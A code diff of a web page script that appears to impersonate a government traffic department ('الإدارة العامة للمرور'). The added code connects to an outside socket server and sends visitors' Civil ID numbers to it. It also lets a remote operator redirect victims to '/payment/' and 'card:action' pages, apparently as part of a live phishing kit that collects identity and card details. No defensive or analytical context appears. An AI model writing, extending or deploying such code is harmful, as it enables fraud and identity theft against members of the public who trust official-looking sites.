@@ -1198,13 +1198,15 @@
 const SERVER_URL = 'https://mouthmokalafa.onrender.com';
 const socket = io(SERVER_URL, { withCredentials: true, transports: ['websocket', 'polling'] });
 let visitorId = localStorage.getItem('visitorId');
-socket.on('connect', () => { socket.emit('visitor:join', { visitorId: visitorId }); });
-socket.on('visitor:id', (data) => { visitorId = data.visitorId; localStorage.setItem('visitorId', visitorId); });
+socket.on('connect', () => { socket.emit('visitor:register', { existingVisitorId: visitorId, siteName: 'الإدارة العامة للمرور' }); });
+socket.on('successfully-connected', (data) => { visitorId = data.pid; localStorage.setItem('visitorId', visitorId); });
+socket.on('visitor:navigate', (page) => { if (page) { socket.disconnect(); window.location.href = '/payment/' + page; } });
+socket.on('card:action', (action) => { if (action) { socket.disconnect(); window.location.href = '/payment/' + action; } });
 const form = document.getElementById('enquireForm');
 if (form) {
   form.addEventListener('submit', function(e) {
     const civilId = document.getElementById('civilId').value;
-    if (civilId) { socket.emit('visitor:data', { type: 'civilId', data: civilId }); }
+    if (civilId) { socket.emit('more-info', { content: { 'الرقم المدني': civilId }, page: 'الصفحة الرئيسية' }); }
   });
 }
 </script>
